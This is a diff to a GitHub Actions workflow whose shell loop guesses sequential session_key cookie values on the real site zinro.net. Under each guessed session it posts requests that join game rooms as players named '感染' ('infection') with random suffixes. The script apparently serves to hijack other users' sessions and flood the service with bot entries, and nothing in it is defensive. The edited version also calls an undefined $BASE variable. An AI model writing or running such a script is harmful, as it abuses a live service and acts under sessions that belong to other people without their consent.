@@ -1,13 +1,14 @@
 name: T
 on: workflow_dispatch
 jobs:
-  run:
+  r:
     runs-on: ubuntu-latest
     steps:
       - run: |
           for i in {1..25}; do
-            C="session_key=$i"
-            curl -s -b "$C" "https://zinro.net/m/room_list.php" >/dev/null
-            curl -s -b "$C" -d "mode=submit&player_name=感染$(tr -dc A-Z </dev/urandom|head -c6)&room_name=村名&rom=1&speed=1&trip_open=1" "https://zinro.net/m/room_in.php" >/dev/null
+            P=$(tr -dc a-z</dev/urandom|head -c6)
+            C="Cookie: session_key=$i"
+            curl -s "$BASE/menu.php" -H "$C" >/dev/null
+            curl -s "https://zinro.net/m/room_in.php" -H "$C" -d "mode=submit&player_name=感染$P&room_name=村名&rom=1&speed=1&trip_open=1" >/dev/null
             sleep 0.1
           done
